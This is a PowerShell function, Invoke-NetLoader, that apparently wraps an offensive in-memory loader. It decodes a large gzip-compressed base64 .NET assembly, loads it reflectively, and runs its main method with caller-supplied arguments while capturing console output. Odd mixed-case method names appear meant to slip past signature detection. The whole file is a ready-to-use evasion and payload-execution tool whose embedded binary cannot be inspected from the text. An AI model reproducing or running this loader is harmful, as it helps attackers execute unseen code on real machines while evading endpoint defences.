function Invoke-NetLoader
{

    $a=New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("H4sIAAAAAAAEAO1ae3Qc5XW/M7s7s7vSrrUrW16BZK9lY9YWEjY2xnb80stGRLIUS35gkpjR7kgae7WzzKxsixCOaJoQ2sDBTdITSEiBJunJgyYh9ASS0JQTkp7QQ0sT0tATSsmBniYccvJonm0x/d07M7sryRDSf/JPRtq733189/Xd734zIw0fv5NCRBTG59VXiR4m79pHv/2axye5+ktJeij25JqHlaEn14xPW2627NhTjjGTzRulkl3JTphZZ7aUtUrZ/pGx7IxdMLsTifg6X8foANGQEqKbbpqdDPQ+T6rSoDQQbQQS9Wg3DwJk8bne947Hquc3Ue2b7vXofIVo37uJmuS39l39kmsd9B4lT+/zYVp6IcjGN5CLJVe26rpcUeBX1+HdFfNsBd9/vMGTlVjVJSqu73ZcJ0++b/CRNHwuWyi3D7/djlm0876v876uK5bI9S528/pB7/tqmRKhfdD9YhuRAlz3rP1O18WbVHoXyfwU5eB03I4AxEmzoSue6LwqZkNvvJKCTAPpdpRFYgCqQDsO0HJeaQ6nwl1x8FEG8cbntlLMRmhxIT/6XFtsthnzmyOpyHJfNpqK2AlI0LN0c5LndCLpG0lp4riW04HrqM3zL0xZVdKT8gTjtIxyyzBYvevksRzE4zn4Fm/wqfrJY6uXB4w0K65jZE4eS8RqrOZwy0n4FM42IPzzCoeRTqW7Gii2+vqTx5oj1BnDsCzDVKRmq1nzdaY0KG2qd6NZr2ctX8CK1rMyC1ixelbbAla8npVdwGqoZ61bwGpsaU5sv4cz6MsEog0nj6USFx2vFw7GzTwxmUqGLraX+6vK6RgLVKQaeW7meH12U/qx5mUBH5ouSi1L6dcuUN/cpOZWMDtIVLyzhVKJlceaE6lEKnY+zFZ2jr+KdvZcYj05WIuy2wK5G0mTFc+trPMmTSGnBxK5DIhuK4tpzalOSqU29rR5NY16pX+DlhfxSXi1rTSjzrcT9xjUkZoDSYsv1N4YhW7Vsaq6LxLdoRxKT2voJH1j86YQQZh7F3SEWnIh0RKO5CKBCLEd+I6dKTK5izleLTxqt3GNighkdDrgtQbI3GHdDiEl3tLQuYE0XdXP5dohG7JXcdHWje+w3nbO+NZHSF95rEHHtPPhRKzrSQ0bJ8p2I3SjKrFjH0dZOdvWyHk/Aoq33J7m/dvS2JIQQnPY+SAHuhp6nXuC0fHmCPS2nFc52SiEnZ3S4dTmZS3NTdt/wD1iWarp7maNUprsfuc+noq+F+9qCUgPBCQo6VRaiBV1LaOVjc4XmbOG93x1/pXKkvl7lQvMP0YrE2pK43XrROHoKS8Bvp9dnaSm9Lubo9GAsELylorm1nKPWid7vTOcijaHyXkzDKTCuUsWOPKFpY589UKOHKDXcWOD50as6sZyz41YzY14ZygVq7P75FK7/3ohu1P1duOwmopf29yQavDXtbmxczsksEWP3d2cqNpfqacaPRcSNRfu79RATiXup1QjlDVi3IBNyPJfgWNNoDWlmlLLODKpAv38q69qufX+JmS5KOUapH41PZYKozWuFExqO0KnSc7SFDn/iVCc/wHw94qzUgVhsxoQGvSnsJnU3KW8D3mrVBht5C6hJaJa7A7rZC7HrX5fOmwjAI0dwCHS1UqxFmbnNvAqOiNqtbLEB5WAUIx9CGFKg96VljSotSw0kRrvJI2PcZZHOFIOpK6+9rzicUKbFOoPDkrn9qoN557aEGEEw+/Vhk+Eq8PbIsEQ/UOR877B60EbpRxgiM84ttPI9OVxNbTS7eRugdMUp3v8aa8/6FqLh1t2F+B6eq5Jx2GKHqDrwUnqNQPvDG2kNV3erRP3rSJJL8SayBLMa4vW5KNVQoP2VGjhmjDaqD8VWUhlNBGNOQ9jpg2y5jzBI/QRDXuNUuGNnFc0UUpKT+rGpIvkkMVyhFvineGV/gJwXtbLScVyy6QuuhLOD6BO1ivemXB+VkNeb87/1s9p0ZfO4fw3Sf7tywMO54fPhpS3LthRmsfNbfJqnlWry2/G7gvbmzn3uSsYCqHlbl+HSiPQkfZ0bOEM5XjZNHsra7qS624br5Lm5OCXfZWM7e280O4Ovk/R7Z34itpvYk7U3kV8+0WxjeJ3ktfR072b+eqimJZ7Me2pxRShOPxbwfRkmA9gbb2Dg6ccyu1lh9bLwdS11tkKmuqMA9az9zGQsu1cS79Vhlbezodsg94Sul+f57SEL1vh3SA6ZY62J2hnKwlGOQo4rEX4oEXf6JwMd72OeJMvnmv1pLeHu9KLpX3RZWprLlEV7Uz6qG9o4yQfydy2co0MWhg0c2Y2HoSNxTTO4VuR25bavqm1rrh2odaFE1ZX+a5Hq2tdarV18Y1vBNumM04tud5ggZux/0dhZ6XUcpIduEgseDK5vmoVriXR3aL5Jvz2d6NebX+dCXIerqEbVy2X5di4Ss2hxcQ39o5d06vI04L37HF6a/em7i2btmzeQXLXwn3iWdxErL0Zzxho4tNI89qximOVplyW+BwMv8z8w2P0kVbv2WztgcOD3L8+A3w7crO2t2hP+G0TNxDK0XaV+Myj/75kCyeTrW/27pFkzI9U/KAz4MkLfaXPU717Nt/juP+tYV0OA+YFflZgi8JwTOlRNCopBcC/lfFRlekFgcfCO8Ia3RWeA3wEME4vhb8LGI58F5Q34UZOo0OAcTorlPdHeNbjAp8R+OsIa1in8XiXQEvgvMAPCnxC4Pe0f9I0+qWMNZ1hRuCIQFfgu3X2806BHxb4ZZ19fgYwTr/SX9bjFIsyzAi8TOAuge8AhIfRAiQfE8p3hLIlxh4eBqRq3hT5aaKMZJfHKhgdckaqtEqwzT7WIdg+H1uPkvwP2kGjWdbz5zQra/ATH3sf+i/uq9d62D3oNmG6yccewgOcTvf62NfpUpx7jwt2jr4Ha0nKrPN4P6Hd8O3e9R7vF9QHm+su9bDzuFNO0biPrVGG0QWLPnaV0oe+9xUfe6syBuxpHzujHIc3W3MedpsygYr6jI/dpUwCe9rH7lNOAotu8LDPCrbLx76p2MDGfexflNPI4Id87IfKTdRKP9/gxfAL5Y9w1jVt9Hhh9Va6mHI+llbvQC72dPoxqB/C3ckxH+tU/4LWUtHHrlI/TuvoaR/rUfvoEtoubw/ek7lG/RSwTYKdy1wWYx7J7mDeX1exbyij6kN0aRVz1C/JDvOwm9XHqWvBvO66eU/Qprp536atdfOep50L5u2qm/cD2lM370e0d4G9XqnA93IroDvlWf7DakBR6RNqU1OIvrCAwnO/Jm+LnhH6C0L/mtA9yn8J5RUZ66EapVHGrQLXCezm2xe6Ssb76uCbBY4IPCrwOpEshtjK6RBbvyXU1BSh9wr3A8K9pTpW6C6BHxP6p2X8oIwfWzQO0bdF28eE/uySWS/I+OciGQ+rkLwk/Nr0iGjToEGFDFPUC+g0wwFURT5Utf4W4kq6FvAVMmRs0c/CqmJRW0RX5ujtkUblFipGUspt9J7ICuUc3S3w/kgrKJ+OrAL3y5EO5S56KvIpuo/+PbJeuY9ejGwDfDmyU/kknNsLGNf6AZdrg5h7pXZQuIeVR2DxOMZHtBOgT2im8phQvinwk/RR7X3KP9NXtA8o36cXtXsBf6R9XPkhndcegvwR7RHlp5TUv6r8hlbpj4O+Xr+Jvk9X6d8S+jOQ6dGfU1rJ0H+jxJSXI4r6SXqHrqkbaF4fo5RyjZpT1yj369uUNcoD+hXqffSgPqJuUL6hv11thf5pdTPquaz+lF7Qz6g7FDU6D9gRvVV9izIYvV0dVK6Pvh+UcvS4skO5NXq3aimcQ0O5N3ovND8Y/QQoj0QfUG9QXor+Hey+Gv0H9RwlY99ROd5nAZtjrZKNl2B9VeyEEpNVuAV6XlFV9JRf4unpFvo1dmYzJULd6CQtoTw6RTj0LoF/KXCDckq5RblVuVv5tPKCsky9SF2trlV3qgPqmHpMzavvUB9U/159Sn1R/bH6azU8T4suPgvqX6AqNCTfC2mH/Z3M1cfvG1Wc0v/Ih8quYbswWzT30EGzMmQbBdPpNs+aNYwOmJVRx873FAqO6bp0xHIqs0YRpIqZrxALDVkTjuHM0Yybt52iNUFjc27FnKGRiZMsMjxbrFh5w630m0VzyqiYrFKUFzzbgWqQB86WbadSR/B1B5TxubJJ/XMlY8bK94wODpZO26eqhP2zpXzFsks+9aztDJTy/WaepnAfYxR7HNz6DBtWiUaNSn56YPwolQ3HNb27oj675NpFc7BUnq2Qj7zZnPNEem27uECgjCmVq81i2Y+1+5A5WTTFOvW4rjkzUZyjImLsGRsORAZHaL9VNBGzSY6JtNl5o8gUuDNNU2alZ3hskImixXK3be21KkyHp6PGHGsLpAJ02KxM24XB0qRNJ2dLp4IEkCUZ6BubNpyyJ0MF+0yJ5xw+NESuLGnFztvF8aExMVGqOHOjNoKicceamjKdwITJKSwX7TmaLQ3UjYMCYOfZJerOV2yH/NwP9rhzpfwh08Xak4z7jGJxwsifol5zygqWaKBUCJZwaOigMWOSVxG9hgum1IJQg8AE6TNKXD37HXum33JPVZlBeUmNjBoOZCum41b5Eh4K2uIV7DcqBp0y50anHbZlcG1MYLRtKwqGVyhfK4GJuYrZ4zjGHE0GqzUZLORMbQVmnSIym+fEkOHOoHIkgyw/4nDaxbBUoVeamF/gIdvwl0R8L7BvxoxrofhHKw7Z3j7yTNFhB9+OUZyyjBEnT1fPlW23Ys/Ys27vrGNBYz7ItOOl/8A0BM44VgVVftBwCnTQLlWMidmi4RTneo3SKXcaM+hae9qambBK1o1SgIdLVsnNO9YENB6fm7Jdy+2zbadglbz6DOp+tlSxZszuQU6tXR4zndNW3nRpBJFWsLEmZrHfhyyE6sxYxgHHKMEur8Ki+X32TBk5daoKPILYOmQWjbMycms6/YksBtaEVbQqczWur73fMqZKiN7Ku8RNzG8qfbOOY5YqAcX/9kqvzy4GGxn74oRHdAOFNa5Lh7CHR0rFuRpNynZwoDQ7YzoG7wbuaDWM9fmmF9oUDncCqW+vH9G4PWSfQaKwR9yjltchTrCFoBcO26fNg/zXrEFsAxSBMQFN3hBeIDyUznEsCjQB27aV7PIJ7KmilUdbGUZbw7JLEOBuuSIYbd5GmDhue170lFyLggaJTDuWi8QM3IATwOW9bhStwkiZ40P4A2fzZlkyx5ZYBmvCvRQtjYYt14UWrxvVJPuLxYN2Zb89W6on1h0UwXi/7SzeyH7b9ztI71xt3cc5LbLDOJOcuMPj+7ezOpbi4iqdNp2KlxnE7vd2OopdYg5ZJZO8/T5YKphnRyaJe02vdAd/caDJHw26B2eLxRFnYKaMYP2q5G18tVEqFCUExliDTznsr02fXZ6T81OOBagzjRkZ9uSlLH0Kez9klqZQAbxEgo9ZN6JV4pQxHWk9TPNPILMgPcTLsxQkz5KY/OTgaKej5sQh84ZZ08VZByvI3NWVSrmOOogxavTsnOj2RpAsoHYto9hn5KdRYzWCK2L95qSBjlNPdrnmF+H+iSTWUK0lV7JUHSMu25nzo69j+BRO2zgXtbdEfsOQmhg2SsYU9xYzj1ZYmasecpwRtryYIV7XnX3XACLvhlPxthzqeLBkBpXcnZcj7nBpRuwUFtVjrfvwWefdUpzmuFHRRHv34y7doiKhv1OWKmQDlkFzyAUtSzOgFPBcXhQMty/g2uBWwMez3aWXLaJmCftMvifxPQuswHIbWK4fWor4PgP97mtJ4oFrC23nZ8PQdqKGLjxPTtA24EqsOnrnddRJb8PMHl8j+zsFHTPwpSS+eTT2uVesmTIzK/y8xMQRs1c88igWeFOShWnQZjCyQQlw9rNIc0Tw46xEq4h3/ngq8Klf9DmQLGNmoPMYjdChqv2A62V9QqQMoWYRhVuddQoSTLuU3oFn53fim23y+rBPSoLtVzFwvDy4PqeKNXNOCpKrbv+bLh4A7Qzut0/7OTsKaUt8ola264BqQnILXVGb1X4EMrzOs9BepFGMbZmTB6TdQQ7GwM/jB/WNn0mpn6IfXQm+2vg55Uc/QOOwvYZo2WHIGvDYpJ383w7zty0kXFcthbf5mJf6LO3yE7VHOLWUMKc+uSeqnD2+hiBFSyUDDutU5j8fqxpnV0b8teX6KEkmvOowZNW8/WNINVYkk1lRzRWWFwfqK82QPWD4lWz71eZcUE99XU+8Tl13w+UfxaoZei2X/z+OLizWSb951Dv22qXeDeqwFLinyfQ3P4duoxiD7TBXt+kCbYVF28rbmt66c7iPxuoWfqcYMiQUQ7qa5+7SgNmlwQUhe8EE5gONXp+z6laHXc77ifTK0MDnMJwdEmkbodX0LEyb12dZg+Gv1i9iddX4u6zXrBTBwubtVtdjcVP0ZAKnAgeWtqHfZaWM12nCk35qLpQGhN1+QCLx2kge7RxPhFJFHAG1Dvn+4SEFMx1/Xg9RinPAbbLWmHp8ypgsSgltfxbWJyVLFDsD+2/hmRidod34odZZ2i82e7GB+qmPDmDcw5zUQk4/kX5A2hSF0JZWB03OW+rL4X0PeFeDIm3rYj6WlmZCeLFpYHhOf0Ot0iu9vGSuIIcdHtpRrGiVm68D5NmjVZlgpwZSWcTQg+8heC5/Zt7zZ7/67itb/6rvgbnH/nTkT669jKJfvPGtR1q3Pn9bmJRMMkJqJpPUKJRJJtU4hduSyXSiqb0tRqG2jIx0Utsj7ZFkSGtvi5CitCf5nR/mYQJwNZXSSEmvaI+IYDLFr0kz/NIwjOWJMC+Rbodgm0BIwG40yvT29IoYRZRke1JNgqAyUyxE2LUMsq5EsqrSlgGEk7FsOL0mk0xf0hbJKpn0mmg2rGZaY02xxqwGBo/A07OqisGaMGSS0WwovYZnKN4bKBCVKEbpK8NZSu9g0AMzbfgkwVOTGLBdVdUyjbqW3pEeyKR71PQwaHF2ikE0A6AxSGY0WEumrsU4nmHlnE/4KtlJrtCbM1EtrsWj/pWMRjNqRA9lMmpYVzOc2rSFLCOeNiRXB9bG3t0AAnIR1cPtkWh7RGWjojnJyVOSsSZFjbavolUUisNkFimMgK0kMRtBrNBTnFMkFT9Jtqu2QxmvRGr+Foi0NkQpDAvRTDSua5lMuqk9EmOXkmpIVzDAesayIQWLmZq/Xc+G4EQUonAnPX8bHIrpEcxqTC/nhY5iooqwVPYUGU3w/ARiU7HyCWSoDcFBLgm5NpUXfv4eOE3p+Y9HEOz8AxoShy8hfV7gOY90DuraIwk9nJ6/D6z0/N9IQSmp+UfhZ5SNtbOxdo3z3Z7UKZzkC76o7ZyLTDQKT9NNMS/hKqtNzX89qsif/+C64v9/5ir+89W42nLUMcoH6x4ex6cd+4zLryaHBmtvMEvB/6Fe4Lp+8ELUE322M3DWlBd+8mbSNLsLxaLwXr2EsvsurOz3cqny99cs7sT4be527z9J6y7vL72jr0GfvgCdr0XEKv1OfO69Hvmt+7/Xn0wQvaTU8CGV/2Z0BA3uBOAAGjC3uhE6CHwQcL/8lwTRo+Efnw/01l97/e8wLeX2C+2IHDL7/dsavjPgI4yvdTJrXI6hElp10b9B4gPauz4X/ozCOsZAd/yGvFTTe0VmU/VnK442/rvYZcR/cQnk++VAyIue8gI7WXw2oVprskf8e8OazCYcjLUP4eY2CflBOYy8O3s+tA/6txKEER/DQ9XbAb4v4qc65uXEryGMp2RWH6TKOKDYsyniA83zqV9sjPh0y7cR+Fh6Q7a2Slze7UBBDsbKkugWx7Zd5vTI8clPbRP+8fnb5vH14y9/ddfeszPF7GnTcbHLd3ds7t7UkTX9dzS7Ow6P7+/a3pF1K0apYBTtkrm7Y850O/buScR3Gf4b9SwUlNzdHbNOaaebnzZnDLdrxso7tmtPVrry9sxOw53pPr25I4sndGvSdCtH6q1BVTZbVTYo7yQqcws84p+ObMmYgfnhuZ4yvy2Td1vdRrnccbmnoeLMuhV+7/IG/bnCs4yZrv/+wcdBcbz3LWZh1LFOW0VzynTfoNYtHVUt9XrQ8vKz7PGQedosZosMd3cYrveWzOnIzlre+6XdHZNG0TX9oETJ5RfwJnD98gW+77q8mgReoMuDpAJZ0gr+cF3o2uf93878jt+3I3+4fh/X/wEqi3FsADQAAA=="))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [NetLoader]::main([string[]]$args)

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
  
}
